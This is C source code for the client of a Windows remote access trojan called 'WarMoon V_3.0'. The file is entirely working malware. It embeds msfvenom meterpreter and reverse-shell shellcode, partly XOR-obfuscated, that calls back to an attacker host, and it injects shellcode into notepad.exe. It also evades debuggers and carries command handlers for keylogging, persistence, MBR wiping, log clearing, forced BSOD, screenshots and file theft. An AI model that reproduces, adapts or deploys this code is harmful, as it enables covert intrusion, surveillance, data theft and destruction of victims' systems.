#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <winternl.h>
#include <wininet.h>
#include <windowsx.h>
#include <shellapi.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "Headers/Variables.h"
#include "Headers/BSOD.h"
#include "Headers/Clean.h"
#include "Headers/Download.h"
#include "Headers/Drives.h"
#include "Headers/IsAdmin.h"
#include "Headers/Keylogger.h"
#include "Headers/Persistence.h"
#include "Headers/TransferFiles.h"
#include "Headers/CheckVM.h"
#include "Headers/Wipe.h"

int sock;
struct sockaddr_in ServerAddress;
char *ServerIP = "ATTACKER-IP"; //CHANGE THIS!
unsigned short ServerPort = 50000;

struct sockaddr_in FileServerAddress;
unsigned short ServerTransferPort = 49500;

unsigned short int PersistenceTechniques[5] = {0, 0, 0, 0, 0};
int RemovedPersistences = 0;
unsigned short int KeysNotDeleted = 0;

char Site[30] = "X";

char BaseFileName[] = "IMG_"; //Base
char FullFileName[50]; //Will store the entire file name: BaseFileName + UnixTime + Extension
char Extension[] = ".bmp"; //Extension

BOOL IsKeyLoggerOn = 0;
HANDLE KeyLoggerThread;
BOOL IsShiftPressed;
FILE *fp = NULL;

char XORKey = 'P';

//msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER-IP LPORT=4444 --platform windows -a x64 -f c -v ShellcodeX64

//msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f c -v ShellcodeSpawnNetcat

//msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=38524 -f c -v FallBackShell

unsigned char ShellcodeX64[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x51\x56\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41"
"\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x50\x49\x01\xd0\x8b"
"\x48\x18\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x06\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
"\xf0\xb5\xa2\x56\xff\xd5";

unsigned char ShellcodeSpawnNetcat[] =
"\xac\x18\xd3\xb4\xa0\xb8\x90\x50\x50\x50\x11\x01\x11\x00\x02\x01\x06\x18\x61\x82\x35\x18\xdb\x02\x30\x18\xdb\x02\x48\x18\xdb\x02\x70\x18\xdb\x22\x00\x18\x5f\xe7\x1a\x1a\x1d\x61\x99\x18\x61\x90\xfc\x6c\x31\x2c\x52\x7c\x70\x11\x91\x99\x5d\x11\x51\x91\xb2\xbd\x02\x11\x01\x18\xdb\x02\x70\xdb\x12\x6c\x18\x51\x80\xdb\xd0\xd8\x50\x50\x50\x18\xd5\x90\x24\x37\x18\x51\x80\x00\xdb\x18\x48\x14\xdb\x10\x70\x19\x51\x80\xb3\x06\x18\xaf\x99\x11\xdb\x64\xd8\x18\x51\x86\x1d\x61\x99\x18\x61\x90\xfc\x11\x91\x99\x5d\x11\x51\x91\x68\xb0\x25\xa1\x1c\x53\x1c\x74\x58\x15\x69\x81\x25\x88\x08\x14\xdb\x10\x74\x19\x51\x80\x36\x11\xdb\x5c\x18\x14\xdb\x10\x4c\x19\x51\x80\x11\xdb\x54\xd8\x18\x51\x80\x11\x08\x11\x08\x0e\x09\x0a\x11\x08\x11\x09\x11\x0a\x18\xd3\xbc\x70\x11\x02\xaf\xb0\x08\x11\x09\x0a\x18\xdb\x42\xb9\x07\xaf\xaf\xaf\x0d\x19\xee\x27\x23\x62\x0f\x63\x62\x50\x50\x11\x06\x19\xd9\xb6\x18\xd1\xbc\xf0\x51\x50\x50\x19\xd9\xb5\x19\xec\x52\x50\x51\xeb\x90\xf8\x51\x56\x11\x04\x19\xd9\xb4\x1c\xd9\xa1\x11\xea\x1c\x27\x76\x57\xaf\x85\x1c\xd9\xba\x38\x51\x51\x50\x50\x09\x11\xea\x79\xd0\x3b\x50\xaf\x85\x00\x00\x1d\x61\x99\x1d\x61\x90\x18\xaf\x90\x18\xd9\x92\x18\xaf\x90\x18\xd9\x91\x11\xea\xba\x5f\x8f\xb0\xaf\x85\x18\xd9\x97\x3a\x40\x11\x08\x1c\xd9\xb2\x18\xd9\xa9\x11\xea\xc9\xf5\x24\x31\xaf\x85\x18\xd1\x94\x10\x52\x50\x50\x19\xe8\x33\x3d\x34\x50\x50\x50\x50\x50\x11\x00\x11\x00\x18\xd9\xb2\x07\x07\x07\x1d\x61\x90\x3a\x5d\x09\x11\x00\xb2\xac\x36\x97\x14\x74\x04\x51\x51\x18\xdd\x14\x74\x48\x96\x50\x38\x18\xd9\xb6\x06\x00\x11\x00\x11\x00\x11\x00\x19\xaf\x90\x11\x00\x19\xaf\x98\x1d\xd9\x91\x1c\xd9\x91\x11\xea\x29\x9c\x6f\xd6\xaf\x85\x18\x61\x82\x18\xaf\x9a\xdb\x5e\x11\xea\x58\xd7\x4d\x30\xaf\x85\xeb\xa0\xe5\xf2\x06\x11\xea\xf6\xc5\xed\xcd\xaf\x85\x18\xd3\x94\x78\x6c\x56\x2c\x5a\xd0\xab\xb0\x25\x55\xeb\x17\x43\x22\x3f\x3a\x50\x09\x11\xd9\x8a\xaf\x85";

unsigned char FallBackShell[] =
"\xac\x18\xd3\xb4\xa0\xb8\x90\x50\x50\x50\x11\x01\x11\x00\x02\x01\x06\x18\x61\x82\x35\x18\xdb\x02\x30\x18\xdb\x02\x48\x18\xdb\x02\x70\x18\xdb\x22\x00\x18\x5f\xe7\x1a\x1a\x1d\x61\x99\x18\x61\x90\xfc\x6c\x31\x2c\x52\x7c\x70\x11\x91\x99\x5d\x11\x51\x91\xb2\xbd\x02\x11\x01\x18\xdb\x02\x70\xdb\x12\x6c\x18\x51\x80\xdb\xd0\xd8\x50\x50\x50\x18\xd5\x90\x24\x37\x18\x51\x80\x00\xdb\x18\x48\x14\xdb\x10\x70\x19\x51\x80\xb3\x06\x18\xaf\x99\x11\xdb\x64\xd8\x18\x51\x86\x1d\x61\x99\x18\x61\x90\xfc\x11\x91\x99\x5d\x11\x51\x91\x68\xb0\x25\xa1\x1c\x53\x1c\x74\x58\x15\x69\x81\x25\x88\x08\x14\xdb\x10\x74\x19\x51\x80\x36\x11\xdb\x5c\x18\x14\xdb\x10\x4c\x19\x51\x80\x11\xdb\x54\xd8\x18\x51\x80\x11\x08\x11\x08\x0e\x09\x0a\x11\x08\x11\x09\x11\x0a\x18\xd3\xbc\x70\x11\x02\xaf\xb0\x08\x11\x09\x0a\x18\xdb\x42\xb9\x07\xaf\xaf\xaf\x0d\x19\xee\x27\x23\x62\x0f\x63\x62\x50\x50\x11\x06\x19\xd9\xb6\x18\xd1\xbc\xf0\x51\x50\x50\x19\xd9\xb5\x19\xec\x52\x50\xc6\x2c\x90\xf8\x51\x56\x11\x04\x19\xd9\xb4\x1c\xd9\xa1\x11\xea\x1c\x27\x76\x57\xaf\x85\x1c\xd9\xba\x38\x51\x51\x50\x50\x09\x11\xea\x79\xd0\x3b\x50\xaf\x85\x00\x00\x1d\x61\x99\x1d\x61\x90\x18\xaf\x90\x18\xd9\x92\x18\xaf\x90\x18\xd9\x91\x11\xea\xba\x5f\x8f\xb0\xaf\x85\x18\xd9\x97\x3a\x40\x11\x08\x1c\xd9\xb2\x18\xd9\xa9\x11\xea\xc9\xf5\x24\x31\xaf\x85\x18\xd1\x94\x10\x52\x50\x50\x19\xe8\x33\x3d\x34\x50\x50\x50\x50\x50\x11\x00\x11\x00\x18\xd9\xb2\x07\x07\x07\x1d\x61\x90\x3a\x5d\x09\x11\x00\xb2\xac\x36\x97\x14\x74\x04\x51\x51\x18\xdd\x14\x74\x48\x96\x50\x38\x18\xd9\xb6\x06\x00\x11\x00\x11\x00\x11\x00\x19\xaf\x90\x11\x00\x19\xaf\x98\x1d\xd9\x91\x1c\xd9\x91\x11\xea\x29\x9c\x6f\xd6\xaf\x85\x18\x61\x82\x18\xaf\x9a\xdb\x5e\x11\xea\x58\xd7\x4d\x30\xaf\x85\xeb\xa0\xe5\xf2\x06\x11\xea\xf6\xc5\xed\xcd\xaf\x85\x18\xd3\x94\x78\x6c\x56\x2c\x5a\xd0\xab\xb0\x25\x55\xeb\x17\x43\x22\x3f\x3a\x50\x09\x11\xd9\x8a\xaf\x85";

unsigned int GetUnixTime() //Now each screenshot that will be taken and transfered will have a unique name (Avoids overwriting older screenshots taken in the past).
{
	time_t GetTime = time(NULL);
	srand((unsigned int)GetTime);
	return GetTime;
}

char *str_cut(char str[], int slice_from, int slice_to)
{
	if (str[0] == '\0')
	{
		return NULL;
	}

	char *Buffer;
	size_t StrLen, BufferLen;

	if (slice_to < 0 && slice_from > slice_to)
	{
		StrLen = strlen(str);
		if (abs(slice_to) > StrLen -1)
		{
			return NULL;
		}

		if (abs(slice_from) > StrLen)
		{
			slice_from = (-1) * StrLen;
		}

		BufferLen = slice_to - slice_from;
		str += (StrLen + slice_from);
	}
	else if (slice_from >= 0 && slice_to > slice_from)
	{
		StrLen = strlen(str);

		if (slice_from > StrLen -1)
		{
			return NULL;
		}

		BufferLen = slice_to - slice_from;
		str += slice_from;
	}

	else
	{
		return NULL;
	}

	Buffer = calloc(BufferLen, sizeof(char));
	strncpy(Buffer, str, BufferLen);
	return Buffer;
}

int Inject64()
{
	BOOL CreateProc = 0;
	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi;
	DWORD GetPID = 0;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD ThreadID = NULL;
	LPVOID MemoryBuffer = NULL;

	CreateProc = CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, BELOW_NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);

	if (CreateProc == 0)
	{
		return EXIT_FAILURE;
	}

	GetPID = pi.dwProcessId;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetPID);

	if (hProcess == NULL)
	{
		return EXIT_FAILURE;
	}

	MemoryBuffer = VirtualAllocEx(hProcess, NULL, sizeof(ShellcodeX64), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (MemoryBuffer == NULL)
	{
		return EXIT_FAILURE;
	}

	BOOL isDone = WriteProcessMemory(hProcess, MemoryBuffer, ShellcodeX64, sizeof(ShellcodeX64), NULL);

	if (isDone == 0)
	{
		return EXIT_FAILURE;
	}

	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)MemoryBuffer, NULL, 0, 0, ThreadID);

	if (hThread == NULL)
	{
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hProcess);
	CloseHandle(hThread);
	return EXIT_SUCCESS;
}

int SpawnNetcatShell()
{
	int i = 0;

	for (i; i < sizeof(ShellcodeSpawnNetcat) - 1; i++)
	{
		ShellcodeSpawnNetcat[i] = ShellcodeSpawnNetcat[i]^XORKey;
	}

	void *execNC = VirtualAlloc(0, sizeof ShellcodeSpawnNetcat, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(execNC, ShellcodeSpawnNetcat, sizeof ShellcodeSpawnNetcat);
	((void(*)())execNC)();
	return EXIT_SUCCESS;
}

int FallBackConnection()
{
	int i = 0;

	for (i; i < sizeof(FallBackShell) - 1; i++)
	{
		FallBackShell[i] = FallBackShell[i]^XORKey;
	}

	void *exec = VirtualAlloc(0, sizeof FallBackShell, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, FallBackShell, sizeof FallBackShell);
	((void(*)())exec)();
	return EXIT_SUCCESS;
}

void PopupMSGBox()
{
	MessageBoxW(NULL, L"WarMoon Client Active!", L"WarMoon V_3.0", MB_OK);
}

void Run()
{
	char ReceiveBuffer[1024];
	char ContainerBuffer[1024];
	char TotalResponseBuffer[18384];

	while (1)
	{
		redo:
		memset(&ReceiveBuffer, 0, sizeof(ReceiveBuffer));
		memset(&ContainerBuffer, 0, sizeof(ContainerBuffer));
		memset(&TotalResponseBuffer, 0, sizeof(TotalResponseBuffer));
		recv(sock, ReceiveBuffer, 1024, 0);

		if (strncmp(ReceiveBuffer, "q", 1) == 0)
		{
			closesocket(sock);
			WSACleanup();
			exit(0);
		}

		else if (strncmp(ReceiveBuffer, "startlogger", 11) == 0)
		{
			if (IsKeyLoggerOn == 1)
			{
				char AlreadyOn[] = "\033[1;31m[-] Logger Already On!\033[0m\n";
				send(sock, AlreadyOn, sizeof(AlreadyOn), 0);
				goto redo;
			}
			KeyLoggerThread = CreateThread(NULL, 0, StartLogger, NULL, 0, NULL);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "stoplogger", 10) == 0)
		{
			if (IsKeyLoggerOn == 0)
			{
				char AlreadyOff[] = "\033[1;31m[-] Logger Already Off!\033[0m\n";
				send(sock, AlreadyOff, sizeof(AlreadyOff), 0);
				goto redo;
			}

			StopLogger();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "cd ", 3) == 0)
		{
			chdir(str_cut(ReceiveBuffer,3,100));
		}

		else if (strncmp(ReceiveBuffer, "persistence1", 12) == 0)
		{
			MaintainPersistence1();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "persistence2", 12) == 0)
		{
			MaintainPersistence2();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "persistence3", 12) == 0)
		{
			MaintainPersistence3();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "persistence4", 12) == 0)
		{
			MaintainPersistence4();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "persistence5", 12) == 0)
		{
			MaintainPersistence5();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "removepers", 10) == 0)
		{
			RemovePersistences();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "isvm", 4) == 0)
		{
			IsVM();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "wipembr", 7) == 0)
		{
			WipeMBR();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "cleanlogs", 9) == 0)
		{
			CleanLogsAPI();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "inject64", 8) == 0)
		{
				HANDLE ThreadAIOx64 = CreateThread(NULL, 0, Inject64, NULL, 0, NULL);
				goto redo;
		}

		else if (strncmp(ReceiveBuffer, "startcat", 8) == 0)
		{
				HANDLE ThreadNetCat = CreateThread(NULL, 0, SpawnNetcatShell, NULL, 0, NULL);
				goto redo;
		}

		else if (strncmp(ReceiveBuffer, "download", 8) == 0)
		{
			char FileToDownload[30];
			memset(&FileToDownload, 0, sizeof(FileToDownload));
			sscanf(ReceiveBuffer, "%*s %s", FileToDownload);
			Download(FileToDownload);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "updateurl", 9) == 0)
		{
			const char *UpdatedURL = ReceiveBuffer + 10;
			UpdateURLDownload(UpdatedURL);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "getfile", 7) == 0)
		{
			const char *TransferFile = ReceiveBuffer + 8;
			TransferFilesToServer(TransferFile);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "diskspace", 9) == 0)
		{
			DiskSpace();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "cleanbin", 8) == 0)
		{
			CleanBins();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "drives", 6) == 0)
		{
			EnumDrives();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "isadmin", 7) == 0)
		{
			IsAdmin();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "hostname", 8) == 0)
		{
			PrintComputerName();
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "screenshot", 10) == 0)
		{
			unsigned int UnixTime = GetUnixTime();
			snprintf(FullFileName, sizeof(FullFileName), "%s%u%s", BaseFileName, UnixTime, Extension);
			TakeScreenshot(FullFileName);
			memset(FullFileName, 0, sizeof(FullFileName));
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "popup", 5) == 0)
		{
			HANDLE ThreadMSGBox = CreateThread(NULL, 0, PopupMSGBox, NULL, 0, NULL);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "bsodwin", 7) == 0)
		{
			HANDLE ThreadBSOD = CreateThread(NULL, 0, BSOD, NULL, 0, NULL);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "menu", 4) == 0)
		{
			goto redo;
		}

		else
		{
			FILE *fd;
			fd = _popen(ReceiveBuffer, "r");
			while (fgets(ContainerBuffer, 1024, fd) != NULL)
			{
				strcat(TotalResponseBuffer, ContainerBuffer);
			}
			send(sock, TotalResponseBuffer, sizeof(TotalResponseBuffer), 0);
			fclose(fd);
		}
	}
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{
	HWND Hide;
	AllocConsole();
	Hide = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Hide, 0);

	BOOL CheckDBG = IsDebuggerPresent();
	if (CheckDBG != 0)
	{
		for (int i = 2; i < 2000; i = i + 4)
		{
			i = i - 2;
			for (int j = 1; j <= 69420; j++)
			{
				for (int k = 0; k < 5; k++)
				{
					int l = 0;
					int m = 0;
					while (l < 12)
					{
						char NiceTry1[13] = "ABCDEFGHIJKL";
						char WasteTime1[13];
						WasteTime1[l] = NiceTry1[l] ^ l % 3;
						l++;
					}

					while (m < 12)
					{
						char NiceTry2[13] = "MNOPQRSTUVWX";
						char WasteTime2[13];
						WasteTime2[m] = NiceTry2[m] ^ m % 3;
						m++;
					}
				}
			}
		}
		return 1;
	}

	WSADATA wsaData;

	if (WSAStartup(2.2, &wsaData) != 0)
	{
		return 1;
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServerAddress, 0, sizeof(ServerAddress));
	ServerAddress.sin_family = AF_INET;
	ServerAddress.sin_addr.s_addr = inet_addr(ServerIP);
	ServerAddress.sin_port = htons(ServerPort);

	Connect:
	while (connect(sock, (struct sockaddr *) &ServerAddress, sizeof(ServerAddress)) != 0)
	{
		Sleep(3);
		goto Connect;
	}

	HANDLE FallBack = CreateThread(NULL, 0, FallBackConnection, NULL, 0, NULL);

	Run();
}
